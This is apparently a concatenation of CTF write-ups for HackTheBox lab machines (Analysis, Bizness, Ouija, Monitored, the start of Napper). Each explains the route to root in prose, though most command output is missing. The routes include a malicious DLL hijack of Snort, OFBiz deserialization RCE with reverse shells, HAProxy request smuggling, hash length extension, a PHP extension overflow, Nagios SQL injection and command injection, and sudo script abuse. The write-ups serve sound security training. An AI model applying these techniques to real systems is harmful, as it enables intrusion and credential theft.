There’s a logs directory in C:\inetpub:
In logs\LogFiles, there  are two directories:
WSSVC2 is for the internal site. It has a single long file:
Because I’m interested in this alert_panel.php, I’ll use some findstr commands (like grep on Linux) to get only these logs:
Other than one log from me at the end, there’s a bunch of times with jdoe’s password!
These creds work for SMB:
They also work for WinRM:
Evil-WinRM gets a shell:
And user.txt:

Category: Shell as Administrateur
The system root has two interesting directories and a file:
private has a single text file:
This is related to the intended path to escalate that I haven’t done yet.
There is also a Snort directory, which contains a copy of the Snort IDS, as well as a log file, snortlog.txt. The log file doesn’t have anything interesting, but the date is updating constantly implying that Snort is running.
In C:\snort\etc there’s the snort.conf file:
One of the interesting directives for Snort is how it can load dynamic modules. The keyword dynamicpreprocessor is interesting:
Tells snort to load the dynamic preprocessor shared library (if file is used) or all dynamic preprocessor shared libraries (if directory is used). Specify file, followed by the full or relative path to the shared library. Or, specify directory, followed by the full or relative path to a directory of preprocessor shared libraries. (Same effect as -dynamic-preprocessor-lib or -dynamic-preprocessor-lib-dir options).
On Analysis, that’s specified as C:\Snort\lib\snort_dynamicpreprocessor:
The permissions on this folder are:
For BUILTIN\Utilisateurs (BUILTIN\Users), that’s:
Given that I can write data to that directory, I should be able to generate a DLL, write it there, and get execution the next time Snort runs.
I’ll start with a simple msfvenom DLL:
I haven’t run into any issues with AV yet (that PHP webshell using system is typically flagged), so it should be fine.
I’ll upload it to the snort_dynamicpreprocessor directory:
The next time Snort runs (every even minute), there’s a shell as administrateur at nc:
root.txt is the on administrateur’s desktop:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 06 Jan 2024
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
41855/tcp open  unknownCategory: Recon
nmap finds four open TCP ports, SSH (22), HTTP (80), HTTPS (443), and unknown (41855):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye.
Both 80 and 443 redirect to HTTPS on bizness.htb. Given the user of host-base routing on the webserver, I’ll fuzz for other subdomains of bizness.htb but not find any. I’ll add bizness.htb to my /etc/hosts file:
The site is for some kind of business consultancy:
All the links on the page go to other places on the page. The contact us form doesn’t submit, and the newsletteer signup form just reloads the page.
The HTTP response headers set a JSESSIONID cookie ending in .jvm1:
The footer on the page gives more details:
Apache OFBiz is:
a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.
Visiting a path that doesn’t exist (/0xdfwashere) just returns a 302 to the web root.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
I’ll notice a lot of 404s to known Java directories like WEB-INF and META-INF. It’s interesting that these are different from the standard 404 response. Rather than redirect, they return an actual 404:
This is Tomcat 9.0.82.
/marketing/control leads to an OFBiz error page:
/marketing redirects to /marketing/control/main which is a login page:
The tiny footer on this page gives the OFBiz version:

Category: Shell as ofbiz
Searching for “ofbiz exploit” (with a filter on 2023 to look for things available up until Bizness came out and avoid spoilers) finds multiple references to CVE-2023-49070:
NVD doesn’t give too much in the way of detail:
Pre-auth RCE in Apache Ofbiz 18.12.09. It’s due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10
There is an XML-RPC component that is no-longer maintained, and somehow accessible pre-auth. Execution is achieved by sending a serialized Java object to the XML-RPC component. The original discoverer of the vulnerability is a security researcher, @siebene@:
#CVE-2023-49070 Pre-auth RCE Apache Ofbiz 18.12.09#POC: /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=YRef: https://t.co/NSgI7IQckpcc to me. pic.twitter.com/SHOkhzlH09
I’ll grab a POC script from abdoghazy2015’s GitHub. It requires a copy of ysoserial in the same directory in order to build a specific serialized payload with the desired command. Then it builds an XML payload using that attack payload, and submits it to /webtools/control/xmlrpc;/ just like in the Tweet above.
I’ll clone a copy of the repo and get ysoserial-all.jar:
If I run this on my system, I get this failure:
The exploit author is nice enough to say what is wrong - I’m running the wrong version of Java.
I’ll grab a copy of Java 11 here and install it, and use update-alternatives to set it as my active Java:
To see if this works, I’ll try running id:
The message implies that the script doesn’t expect to see the output of the command. It’s a blind exploit.
I’ll listen for ICMP with tcpdump on my host and have it ping me:
At tcpdump:
That’s RCE!
The POC has a shell option, which, with nc listening on 443, I’ll run:
At nc, there’s a shell:
I’ll upgrade my shell using the standard trick:
And grab user.txt from /home/ofbiz:

Category: Shell as root
It’s very standard to look for stored passwords and password hashes the database / filesystem of a just-exploited web application. That proves tricky on OfBiz because there’s so much going on in the /opt/ofbiz directory with almost 18 thousand files:
The OFBiz README.md says:
Note: the default configuration uses an embedded Java database (Apache Derby) and embedded application server components such as Apache Tomcat®, Apache Geronimo (transaction manager), etc.
Derby is a:
an open source relational database implemented entirely in Java.
According to the docs, the database is stored in files in a directory of the same name as the DB:
A database directory contains the following, as shown in Figure 2:
I’ll search for seg0 and find three potential Derby DB folders:
I’ll compress all of them into one file:
I’ll listen with nc on my host, and send the archive into it:
On my host:
The hashes match, so the first is complete and not corrupted.
I’ll show a couple of different ways to interact with the Derby data now that it’s on my host:
ij is an “interactive SQL scripting tool that comes with Derby”, according to the docs. I’ll install it with apt install derby-tools.
I’ll run it, and then connect to my database:
show schemas; will show the databases:
show tables; will show all the tables, 877 in this case:
I can try show tables in OFBIZ;, but that only cuts it down to 854.
There’s a few interesting ones that look like they might have hashes:
The USER_LOGIN table has 20 columns:
There are three users, only one of which has a password hash:
DBeaver is a nice GUI database tool that has a free community edition. I’ll open it and connect to a database:
I’ll select “Derby Embedded” and give it the path to the folder:
Now it shows up on the left side:
I’ll add a filter for “user” and there’s the USER_LOGIN table:
Double clicking on it gives the schema in the Properties tab:
And the data in the Data tab:
I’ll try giving the hash to hashcat, but it doesn’t recognize the format:
At the time of Bizness’ release, there was no good tool to crack this hash format (though some have come out since). To understand what I have, I’ll do some researching. I’ll come across this 2015 post:
So it’s likely SHA1. It references cryptBytes, a function that looks like:
It takes a type, a salt, and bytes, and returns a hash of the format $SHA$[stuff]$[stuff], the same format as my hash.
If I look at the last section of my hash, it is base64-encoded (URL-safe alphabet based on the “_”), which decodes to 20 bytes (40 hex characters):
That’s the length of SHA1.
If uP0_QaVBpDWFeo8-dRzDqRwXQ2I is the base64 encoded SHA1, that leaves “d” as the salt. hashcat takes a format of hash:salt, which I can put in a file:
Now I’ll try to crack it:
There’s a bunch of possible formats. I’ll try -m 110, which tells hashcat to append the salt to the end of the password and SHA1 hash it:
It takes about 3 seconds, but doesn’t break anything. I’ll try -m 120, which is prepending the salt to the password and hashing:
It cracks in two seconds to “monkeybizness”.
That password works for root on Bizness:
And I can get root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 02 Dec 2023
OS : Linux
Base Points : Hard [40]Insane [50]
Nmap scan:
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  pppCategory: Recon
nmap finds three open TCP ports, SSH (22) and HTTP (80, 3000):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy.
The website on TCP 80 is the default Ubuntu Apache2 page:
I’ll run feroxbuster against the site, but it finds nothing:
HTB has moved away from players just assuming that [boxname].htb is the domain for the box in favor of always showing that to the HTB player in some way, but somehow in this box that got messed up. On adding ouija.htb to my /etc/hosts file, there’s a new site:
There’s not much of interest here. All the links go to places on the same page. There’s an email, info@ouija.htb at the bottom. The contact form at the bottom has some client-side validation, but on clicking submit there’s a POST to /contactform/contactform.php that returns a 404.
One other thing to note is that on loading the page, because I have configured Burp to capture all .htb requests, I’ll notice it’s loading two resources from gitea.ouija.htb:
These requests are just hanging because there’s no DNS resolution.
The main site loads as index.html. There is the missing contactform.php page, but I don’t think that is actually evidence that this is a PHP site (more likely it’s part of the template and wasn’t set up).
The HTTP response headers don’t show much else:
This seems like a static site to me.
Even if I don’t think the site is PHP, I’ll add it to feroxbuster just in case:
/admin/ returns a 403 forbidden.
Given the use of name-based routing, I’ll fuzz for other subdomains with ffuf:
There seems to be something blocking anything that starts with “dev”. That suggests some kind of proxy or WAF. And that dev.ouija.htb might be an interesting domain. I’ll update my /etc/hosts:
If I try to access dev.ouija.htb, it does return 403:
The HTTP response headers don’t have the Apache server header:
This further suggests that the request isn’t reaching Apache.
This is an instance of Gitea, the open-source hosted Git application. There’s an option to register, but all I need is available in the one public repo, ouija-htb from the leila user. The repo has the files for the main site:
The README.md file gives the technology serving the site:
HA-Proxy is probably what is blocking “dev*”.
The HTTP server on 3000 is some kind of an API:
I’ll try to brute force paths on the API:
The /register endpoint says it’s “disabled”:
It looks like /login is disabled as well:
Visiting /users returns an error message:
It seems to be using some kind of custom authentication scheme with an ihash header. This can be fuzzed a bit, but to no real value. I’ll return to this later.

Category: Shell as leila
There’s a request smuggling vulnerability in the version of HA Proxy mentioned in the instructions on Gitea:
NVD says this is fixed in 2.2.16, but the post from JFrog (who found the vulnerability) says:
This vulnerability was fixed in versions 2.0.25, 2.2.17, 2.3.14 and 2.4.4 of HAProxy.
NVD is just wrong on this one.
The issue here is how HA Proxy handles requests in two stages with a POC like this:
For this example, HA Proxy is set up to block requests to /admin/.
HA Proxy parses this in two passes. In the first pass, it reaches the third line and parses it into a structure that has 1 byte for the header name length, and then the header name. Because this header is 270 bytes, there’s an overflow, as the binary for 270 is 100001110 (nine bits). As the struct can only hold 8, it stores 00001110, which is 14.  The value of the header is stored in the same way. The length would be 0 (as there is no data after the “:”), but the extra 1 from the header name size actually ends up here, giving this header a length of 1, and a value of “0”. Still on the first pass, it see the Content-Length header of 60, and uses it to read the body to the end of the request.
On the next pass, HA Proxy passes over the struct and reached the malformed header which is now saved as 14 bytes long, so it matches “Content-Length”, with a value of “0” (1 byte long). The next header is ignored as a duplicate. So it forwards on this as a single request:
When the client gets this, it reads the first request, understanding it to be 0 in length, and parses up to just before the “G”. Then it assumes this is another request, coming over the same connection, and processes it as well. This means the attack has successfully bypassed HA Proxy’s block on /admin/.
To exploit this, I’ll send a request to / to Burp Repeater, and update the headers to look like the POC. I had to play with this a lot to get it working, and found that starting another request at the end made it much more stable. So it looks like this:
The Content-Length is the distance from the start of the second request to the start of the third. That way the request sent from HA Proxy will cut off there. Having the third request seems to make it much more stable.
It’s very important to uncheck the Burp option to “Update Content-Length”, which it typically checked by default (and in each new repeater window):
I’m targeting gitea.ouija.htb so that I can know what to expect if it’s successful.
When I send this, the response looks like the normal response for ouija.htb:
However, towards the bottom:
The second response is just appended to the first, and it got the Gitea site!
I’ll update the host in the second request from gitea to dev, and subtract two from the Content-Length to account for that:
It returns dev.ouija.htb.
I can copy the HTML and open it in Firefox to see what it looks like:
The CSS doesn’t load, but the general page is clear. The link to app.js is http://dev.ouija.htb/editor.php?file=app.js, and init.sh is the same path with an updated file argument.
I’ll update the request and Content-Length again, and get editor.php with the app.js file, which shows the loaded file in a text field element:
I can read editor.php by getting ../editor.php:
The source is:
It can read any file on the host.
But it’s a file_get_contents, not an include, so no execution from this (and not an LFI vulnerability).
init.sh is a Bash script that
This script…is full of errors and wouldn’t actually do anything it’s claiming to do, but I’m going to try to learn from it anyway.
The most important things are the two environment variables, botauth_id and hash, which I’ll note. I can try to read /opt/auth/api.key, but it doesn’t return.
There’s also a symbolic link created in the init, putting /proc in the current directory.
I can try to use these two as headers requested by /users on the API:
It doesn’t work. I’ll look at why in the source below.
The app.js file is the source code for the API on TCP 3000:
This code is very clearly AI generated, as it does all sorts of silly things (like checking twice in the /login function if the arguments are provided).
The /users endpoint is disabled as well:
The function that is useful is /file/read:
While I already have file read on the dev site, this is likely running on a different host/container (as evidenced by the fact that the /opt/auth/api.key file isn’t on dev) and is worth pursuing.
This function has the same call to ensure_auth that /users has:
There are four criteria:
verify_cookies checks that the decoded (d) identification matches the ihash header:
d takes a string, base64 decodes it, and then hex decodes it:
So to use the token, I need to take the identifier, convert it to hex, and the base64 (something no reasonable programmer would ever do, but ok).
I can try that with the identifier and hash from init.sh:
That means I’ve got a valid token, it just doesn’t include ::admin:True.
The generate_cookies function is where the hash is generated to be compared to the ihash header:
It takes a SHA256 hash of an unknown key plus the identifier and returns the hex hash. Without knowing the key, I can’t just calculate the hash for the identification I want.
There is a well known attack against a situation like this where there’s some unknown secret prepended to data and then hashed called a hash extension attack. The attack is against how hashes are calculated. Hashes take in any amount of data and return a fixed size fingerprint. To do that, they read in some block size, perform some calculations arriving at some state. Then they read in the next block, combine it with the previous state, and get a new state. Once all the data is read, the state is used to generate the fingerprint.
The attack is that I don’t have to know the data that went into the hash to recreate the state at the end from the hash. That means I can append additional data and work from that state to get the correct hash of the new data.
In summary, in a scenario where I have data and the hash of an unknown secret plus data, I can add more data to the end and calculate the new hash without knowing the original secret. I’ve shown this a few times before, with the 2021 Sans Holiday Hack Printer Firmware challenge, as well as two HackTheBox machines, Intense and Extension.
There’s a great tool for doing the hash extension attack, hash_extender. The README.md has a lot of detail about how the attack works.
To use the tool, I need to give it:
So for secret of length 8, I’ll run it and get:
I can base64 encode that and submit it:
That hash didn’t work because the length was wrong.
The obvious way to find the right secret length is just to brute force it. I could do this in Bash, but to practice some of the better Python techniques I’ve been developing lately I’ll develop in Python, shown in this video:
The final script is:
Running it gives me a valid token:
It says unavailable, but that means the token is good.
I can’t give the /file/get endpoint anything starting with / or that contains .., but I do have that symbolic link to /proc at .config/bin/process_informations. I’ll try to read from that:
That’s the command line showing /usr/bin/js /var/www/api/app.js! I can pull the environment (with some jq and tr to make it pretty):
I’ll note that the process is running as leila, who has home directory /home/leila.
The secret is there, k. It’s 23 characters as expected, and when combined with “bot:bot1” it makes the expected hash:
One of the files in /proc for a given process is root, which is a symbolic link to the root of the filesystem. This is used for processes running in jails or containers:
Using this, I can read basically any file that leila can read:
That includes leila’s private SSH key:
With that key, I can connect to Ouija with SSH as leila:
And read user.txt:

Category: Shell as root
leila’s home directory is very empty:
There’s no other home directory and no other non-root user with a shell:
leila can only see processes they started:
That’s because /proc is mounted as hidepid=invisible.
There are a bunch of listening ports:
All of the 172.17.0.1 listeners are different instances of HA Proxy. When there’s a smuggling attack, HTB likes to load balance users between containers to keep users from stepping on each other in shared labs.
22 is SSH and 3000 is the API. 3002 is Gitea.
It’s not clear what 45241 is. 9999 is interesting.
I’ll find the service with grep in the /etc/systemd folder:
The full service is:
It’s running as root, which makes it an interesting target for sure.
The /development folder also stands out as an interesting non-standard directory in the filesystem root:
Most of the folders aren’t interesting. utils has a debug.php file that’s used by the running service:
This is a super weird file, creating copies of /proc files and writing “1” to another. They are both present:
I’ll use SSH to forward 9999 on my box to 9999 on localhost and load the page in Firefox:
It’s just a simple login form. Submitting bad creds just loads an empty page, thought it’s trying to show an alert about bad creds.
The server-management_system_id_0 folder has the source for this page:
The login portion of the PHP code looks like:
It’s passing the input username and password to a function called say_lverifier. Interestingly, that function isn’t defined in any PHP code here, but it is a shared object loaded into the processed memory:
This file is loaded in /etc/php/8.2/apache2/php.ini and /etc/php/8.2/cli/php.ini (I think the second one is what matters when PHP is launched the way it is here, and the first actually contains a typo, misspelling “extention”):
That file is located at /usr/lib/php/20220829/lverifier.so:
I’ll copy this back to evaluate:
To interact with this plugin, I’ll want to load it into a local PHP shell using the dl function. But dl won’t work by default:
In /etc/php/8.1/cli/php.ini, I’ll change this line from Off to On:
Now it does, and it takes a module name:
From the errors, it’s trying lverifier and lverifier.so in /usr/lib/php/20210902. I’ll copy it there and make it executable:
Next it returns a different error:
This gist shows that I’m running PHP 8.1, but it wants PHP 8.2. I’ll follow the instructions here to upgrade. If I run 8.2 and try again, I’ll be right back at the start, needing to enable dl in /etc/php/8.2/cli.php.in, copy the .so file into /usr/lib/php/20220809 and make it executable:
Now it loads!
And I can run say_lverifier:
It’s interesting that it’s asking for the shadow file. If I run as root:
It seems to be validating passwords based on /etc/shadow.
To debug this code, I’ll use gdb with Peda. To start, I’ll run:
Now I want to load the module. I’ll use r to run, and then interact with PHP:
At this point I’ll Ctrl-c to break back to gdb, and entry the breakpoint (I’ll show where that function name comes from shortly):
c will continue running from gdb, and then I’ll enter say_lverifier("0xdf","password"); and it hits the break point.
It’s also worth noting that the author left some of the source symbols in the binary, which is why it shows the full path to the login.c file from the author’s computer when I put in the breakpoint. If I run info functions, there’s a ton of output, including the functions listed per source file:
I’ll open this binary in Ghidra.
There’s a ton of good information on how to create a PHP module in this post on PHP Internals Book. To create a function that can be called in PHP from a function in C, the PHP_FUNCTION macro is called with the C function which expands to a C symbol beginning with zif_. When looking at the functions, zip_say_lverifier is one:
I’ll start there. The structure of this function should look like the example here:
The macro expands to:
Looking at zif_lverifier, it has the same structure:
It uses zend_parse_parameters to get username and password (and their lengths), and those strings are passed into validating_userinput.
This function is the important one to understand. At the start, it defines a couple of strings on the stack:
(1) and (2) are the strings /var/log/lverifier.log and session=l:user=root:version=beta:type=testing. Also in here it’s messing with the username length, first calculating it at (3), and then getting a modified version of it at (4).
Looking more closely at four, it is worth looking more closely at the assembly (disassemble validating_userinput in gdb):
The value saved here (I’ve named short_username_len) is then again used at the end of the function:
Effectively, this is the result of creating a variable in C with a length defined by something else. If the stack looks like this:
The size of new_buffer is created dynamically, calculated from the length of the input username.
The next block is also confusing, but playing with it in gdb shows it’s not too complex:
If the username is greater than 800 long (based on the strlen response, not the calculation), then it effectively does a memcpy to get 800 bytes at (1), storing it into a buffer on the stack I’m calling username_copy. In assembly it looks like:
Otherwise, at (2) it does a complicated copy until it reaches a null byte, again into username_copy. The string copy path is actually coded poorly and breaks the log data and log file variables that were set above on the stack.
Then there’s another block copy:
Here it’s using the short_username_len calculated above to get the location of the dynamically sized buffer relative to log_path (because the start of the dynamic buffer is that many bytes less than the starting address of log_path, and short_username_len is negative). This ends in a for loop which is much simpler in the assembly:
This time it copies 800 bytes (fixed size) from the username_copy buffer to the dynamically sized buffer. This is where it breaks if the username was less than 800. If the username was 15 long, then it copied 15 into that buffer, leaving 785 bytes of junk. Now we copy 800 bytes into a 15 byte buffer, overflowing the junk into other variables log_data and log_path (preview of what’s to come).
Now that it’s prepped all this data by weirdly copying it around, it uses it to make three function calls:
It prints the log_data and log_path, it passes the same data to event_recorder, and then it calls load_users on the dynamic buffer and the password.
I believe lines 154, 156, and 158 are just misinterpretations by Ghidra when decompiling.
This function has a bunch of Ghidra cruft, but it seems to be very simple:
It also uses a weird length calculation for how much to write, get_clean_size, which reads bytes up until a newline (\n) or a EOF (0xff):
I’ve noted that the username will be copied into an 800 byte buffer, and then that entire buffer will be copied into another buffer that’s the size of the username input, overflowing the log file path and data if the username is less than 800 bytes. That on its own is not enough to edit these, as any data I enter is counted in the length and thus ends up in the dynamic buffer, and only junk after overwrites.
There’s an integer overflow in the calculation of the length for the size of the dynamic buffer, as the variable used to calculate the size is a 16bit short. So if I submit a name longer than 65535 bytes, the calculated size of the dynamic buffer will be small, but it will still copy 800 bytes in, all of which I control.
I can abuse this to get arbitrary write by carefully writing a newline terminated filename and data to where those are stored.
I’ll start by showing the non-overflow case. I’ll put a breakpoint at validating_userinput+111, and run with a reasonable username and password:
When it hits that breakpoint, RAX holds the value calculated as 10 plus the length rounded up to a multiple of 16. So I’d expect 8 + 10 –> 32 (0x20), which matches:
I’ll run again, this time with 65535 “A” characters:
I would expect to get 65535 + 10 rounded up to 0x10010. But the value is only 0x10:
The top bit got dropped. I’ll add a breakpoint at validating_userinput+218 and continue. This is the check for if username is longer than 800 (jumping if not):
“JUMP is NOT taken”. RDX what is compared to 0x320, and it’s 0xFFFF.
Rather than do math, I’ll use a pattern to find out how to overwrite the values passed to event_recorder using pattern_create:
I’ll read the pattern from PHP and send it as the username:
I’ll break at validating_userinput+332 and check the values passed in:
pattern_offset will get the offset from four bytes:
So the offset of 16 is the log file, and the data is at 128.
I’ll write a short Python script as a proof of concept. It assumed that I have a tunnel from 9999 on my host to 9999 on Ouija:
I’ll try it writing data to a file I can see:
The file exists and is owned by root:
Interestingly, two lines wrote:
I’ll try again with my public key:
It appended that data:
Appending is nice so I can target the authorized_keys file and it will add, not overwrite. It’s important to add the newline before the key or it could end up on the same line as the previous.
I’ll run the exploit targeting root’s authorized_keys file:
It works!
And I can read the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 Jan 2024
OS : Linux
Base Points : Medium [30]
Creators : TheCyberGeekruycr4ft
Nmap scan:
Host is up (0.087s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknownCategory: Recon
nmap finds five open TCP ports, SSH (22), HTTP (80), LDAP (389), HTTPS (443), and something unknown on 5667:
Based on the OpenSSH version, the host is likely running Debian 11 bullseye. The Apache version isn’t an exact match for any, as it’s been upgraded for security vulnerabilities to across all distros to 2.4.59.
There’s a TLS certificate with the common name of nagios.monitored.htb on HTTPS on TCP 443, and a hostname of the same. Given the use of domain name, I’ll fuzz subdomains of monitored.htb on both 80 and 443, but only find the redirect on 80 to nagios.
Monitored also has two open UDP ports:
NTP will be useful if I need to sync clocks. I’ll want to enumerate SNMP as well.
The site is an instance of Nagios, an open source monitoring solution:
The “Access Nagios XI” leads to a login page at /nagiosxi/login.php:
Without creds or a vuln, this is a bit of a dead end.
As far as the tech stack, I know it’s Nagios, and that the site is PHP-based. I can’t find a version number, other than the copyright says 2008-2024. I won’t bother yet with a directory brute force, as it is public software.
ldapsearch will fetch the base domain:
I can try to dump more, and it returns something, but not much:
I’ll try to connect to the unknown port using curl:
It fails. nc doesn’t work either. It just hangs, and when I type anything, it exits.
A quick check using the “public” community string seems to work, so I’ll dump the full set of data into a file:
There’s a ton of potentially interesting data in SNMP. One thing to always check out is the running processes and their command lines. Process 1312 in my collection (will be different in others) is a sudo process:
It’s running check_host.sh with what could be a username (svc) and a password (“XjH7VCehowpR1xZB”).

Category: Shell as nagios
Using the creds from SNMP on the Nagios login shows a failure message:
It’s interesting, as if I put in svc and a different password, the error message is different:
Same if I do another username:
That suggests that these creds are good, but that the account has been disabled.
The documentation of the Nagios API is incredibly limited. This PDF document give some overview of what it looks like, but not much. One thing I can get from that document is that the API like likely located at /nagiosxi/api/v1, and that I need an API key as a GET parameter:
After thinking this would be easily documented, I’ll give up and start fuzzing.
I’ll get a request going in Burp Repeater and poke at the API manually a bit. If I try /nagiosxi/api, it returns a 301 to /nagiosxi/api/:
If I try /nagiosxi/api/, it returns 403:
If I try /nagiosxi/0xdf, it returns 404:
That suggests that /nagiosxi/api is a good path. The behavior adding v1 to the end (like the doc says) is the same.
I’ll use feroxbuster to brute force the API. I’ll use the -m GET,POST option to try both GET and POST requests, and -k to accept the invalid TLS certificate. I’m starting at /nagiosxi/api, and it finds v1 quickly (as well as includes):
The /nagiosxi/api/v1/authenticate GET and POST endpoints jump out as interesting! It also seemed to be generating a ton of errors at the end, suggesting maybe there could be more that’s not showing up.
If I try a GET request, it returns an error:
Simple enough, I’ll switch the verb to POST:
It wants a username and password. I’ll try those as parameters:
Perfect. I got a token that says it’s good for 5 minutes.
Following what I learned from the documentation above, I’ll try to visit nagiosxi/api/v1/system/status with an apikey GET parameter. Even on a fresh request of a new API key to make sure it’s not expired, it returns invalid:
To figure out how to use the token provided by the authenticate endpoint, I’ll search for it:
The first result is this 2020 forum post with this in the first answer:
It’s using token as the parameter that follows with the result. It also uses a valid_min POST parameter along side the username and password to set the validity time. Adding this does get the server to return that it has a longer validity time, but it still seems to expire quickly.
If I try changing apikey to token on the same endpoint, it still fails:
If I try the endpoint in the forum post, it seems to work:
Interestingly, it’s returning a PNG image.
I’ll notice that the path in the successful token auth isn’t in the /api/ part of the server. Could this work on the main page? I’ll try visiting /nagiosxi/?token=[token]:
Not only does it work, but it seems to validate my cookie so that I don’t need to keep it in the URL to visit other pages.
On logging in, the footer now has the full version:
Going to the account settings, I’ll find the API key for the svc user:
There’s not much else of interest on the pages of the site.
Searching for vulnerabilities, there are many references to a SQL injection vulnerability, CVE-2023-40931:
Many of these are 7 months old, which means they were out before Monitored was released, so I consider them in bounds for solving. CVE-2023-40931 is a:
SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php
The team at Output24 that found this vuln (and three others) documented a bit more about them in this post:
When a user acknowledges a banner, a POST request is sent to /nagiosxi/admin/banner_message-ajaxhelper.php with the POST data consisting of the intended action and message ID – action=acknowledge banner message&id=3.
The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the xi_session and xi_users table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.
This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.
I’ll try to build the same request described here. I always try to remove unnecessary headers, leaving this request:
That seems to be working. I’ll try an SQL injection:
Typically I like to show manually doing the injection, but the database here is large, so I’ll go right to sqlmap. For some reason this was a bit tricky to get working with sqlmap. What eventually works for me is building the command based on the advisory:
From here I can enumerate the database. There are two DBs:
The interesting one is nagiosxi, which has 22 tables:
I’ll dump the xi_users table:
There’s two users, svc and admin. Neither hash cracks in hashcat with rockyou.txt. But there is an API key for each user as well.
I’ll go back to the original API example from the PDF above, and with admin’s API key it works!
I’ll go back to the API and fuzz it some more, this time passing the api token. The webserver is pretty slow, so I’m going to use a smaller API focused wordlist:
Unlike api and v1 the redirected to api/ and v1/, here endpoints that are paths but not specific endpoints return 200. For example, system:
This means feroxbuster doesn’t automatically start busting inside those, so I’ll have to do it manually.
I don’t find anything in user or User, but in system, I’ll find a couple interesting looking endpoints:
command seemed the most interesting. As a GET, it returns a list of commands:
Unfortunately, POST and PUT don’t do anything:
Sending a GET to user returns information about the two users:
Trying as a POST is promising:
I can create a new user, but how does that help advance my access? Searching for this endpoint returns a very old exploit:
This exploit won’t work here, but it does show using this endpoint with the following data:
auth_level admin is interesting. auth_level also shows up in this forum post:
I don’t yet have admin access to the site, just the API, so I’ll try to create an admin user I can authenticate as.
I’ll try it with the parameters above:
The user is created. I’ll try logging into the site. It returns a License Agreement:
Once I check and submit, I’m in as an admin user:
There’s a ton to look at as an admin user. One interesting menu is under Configure -> Core Config Manager:
I’ll click on “Commands”:
These look like shell commands!
I’ll click “Add new +” and give it a bash reverse shell:
There’s nothing really to run the command here. Back on the Core Config page, I’ll go to “Hosts”:
Clicking on localhost brings up it’s page:
There’s a “Check command” dropdown, which I’ll set to “0xdf shell”, and now a “Run Check Command” button appears:
I’ll click it (and the next button in the popup), and it hangs, but there’s a shell at nc:
I’ll upgrade my shell using the standard trick:
And grab the user flag:

Category: Shell as root
sudo -l shows that the nagios user has 21 commands they can run as root:
The first 11 commands are from /etc/init.d for the nagios and npcd binaries. Neither of these binaries are present on Monitored:
That suggests these sudo rules were installed by Nagios to handle different systems that may be configured differently.
Next I’ll review each script and think about ways I might abuse it. I suspect there are many ways to abuse these scripts to get execution as root. I’ll show two:
On of the commands that nagios can run as root is manage_services.sh. At the top of the script, it defines two lists:
The first arg is saved as action, and the second as service:
It validates that action is in first and service is in second, and then if so, runs systemctl or service:
Script like LinPEAS will check these services for dangerous permissions, but it’s more fun to do it on my own. I’ll start a bash loop to check for all these services:
There are six installed. I’ll loop those into a command that reads the service file, grep for any line with Exec, and then get the binary called there. Then I’ll run ls -l on that binary:
The top two are interesting! They are both owned by the nagios user!
I’ll save a copy of the nagios binary:
I’ll write a simple bash script to /tmp/x.sh:
I’ll copy that to nagios, and set the permissions so that it’s executable:
Now I’ll restart the service:
It fails because this is not a valid service, but it still ran:
I’ll run with -p to keep privs and get a shell as root:
And read the root flag:
The script takes an “id” or folder name:
It strips that of any non-alphanumeric characters and then creates a folder structure:
The rest of the script is running tail on various files and saving the output in the new folder structure. For example:
Sometimes it checks if the file exists:
I’ll use grep to look at all the files that are passed to tail:
Almost all of these are in /var/log, where the nagios can’t write. Still, the last one is in the /usr/local/nagiosxi directory. The section of code looks like:
At the end, it puts all the collected files into a Zip archive:
The phpmailer.log file is owned by nagios:
That means I can modify it. The existing it empty. I’ll overwrite it with a symlink:
Now I run getuserprofile.sh:
The resulting file is in /usr/local/nagiosxi/var/components:
It has 61 files:
I only care about one file:
With that key, I can SSH into Monitored as root:
And read root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 11 Nov 2023
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.10s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  httpsCategory: Recon
nmap finds two open TCP ports, HTTP (80) and HTTPS (443):
Based on the IIS version it seems the box is running something Windows 10 or Server 2016 or newer.
There’s a redirect to https://app.napper.htb on 80, and the TLS certificate has that same domain.
I’ll scan for subdomains that respond differently with ffuf:
It finds one, internal.napper.htb. I’ll add all of these to my /etc/hosts file:
HTTP just redirects to HTTPS. The site is a blog with technical articles:
Looking through the articles for interesting information, one important thing to notice is that in “Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide”, there’s a terminal with the example command to create the user account to use for Basic Auth:
The footer of the site says “Built with Hugo”. Hugo is a Go-based static site generator, which takes in markdown and generates static HTML.
The HTTP response headers show IIS, but nothing else of interest:
The 404 page is just the IIS default:
This seems like a static site.
I’ll run feroxbuster against the site (using a lowercase wordlist as IIS is not case sensitive), but it doesn’t turn up anything interesting:
Trying to visit the internal website asks for HTTP basic auth:
I’ll try the example credentials from the blog post above (example:ExamplePassword), and it works!
There is a single post about some malware research:
